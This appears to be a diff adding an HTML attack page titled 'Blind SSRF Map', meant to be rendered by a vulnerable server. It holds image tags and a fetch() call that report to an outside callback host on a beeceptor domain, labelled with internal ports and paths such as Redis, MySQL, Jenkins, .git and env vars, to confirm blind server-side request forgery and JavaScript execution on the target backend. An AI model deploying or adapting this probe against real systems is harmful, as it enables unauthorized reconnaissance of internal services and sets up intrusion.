@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>Blind SSRF Map</title></head>
+<body>
+<h2>SSRF Prober Running...</h2>
+
+<!-- High-priority internal ports to check -->
+<img src="https://vodagh.free.beeceptor.com/visit_80_admin" />
+<img src="https://vodagh.free.beeceptor.com/visit_8080_swagger" />
+<img src="https://vodagh.free.beeceptor.com/visit_3306_mysql" />
+<img src="https://vodagh.free.beeceptor.com/visit_6379_redis" />
+<img src="https://vodagh.free.beeceptor.com/visit_9200_elasticsearch" />
+<img src="https://vodagh.free.beeceptor.com/visit_5432_postgres" />
+<img src="https://vodagh.free.beeceptor.com/visit_27017_mongodb" />
+<img src="https://vodagh.free.beeceptor.com/visit_5984_couchdb" />
+<img src="https://vodagh.free.beeceptor.com/visit_11211_memcached" />
+<img src="https://vodagh.free.beeceptor.com/visit_5000_debug" />
+<img src="https://vodagh.free.beeceptor.com/visit_8081_dev_panel" />
+<img src="https://vodagh.free.beeceptor.com/visit_8888_jenkins" />
+
+<!-- Internal Paths Often Left Public -->
+<img src="https://vodagh.free.beeceptor.com/visit_dot_git" />
+<img src="https://vodagh.free.beeceptor.com/visit_config_json" />
+<img src="https://vodagh.free.beeceptor.com/visit_env_vars" />
+<img src="https://vodagh.free.beeceptor.com/visit_server_status" />
+<img src="https://vodagh.free.beeceptor.com/visit_prometheus_metrics" />
+
+<script>
+// Confirm JS ran in backend
+fetch("https://vodagh.free.beeceptor.com/javascript_executed");
+</script>
+</body>
+</html>
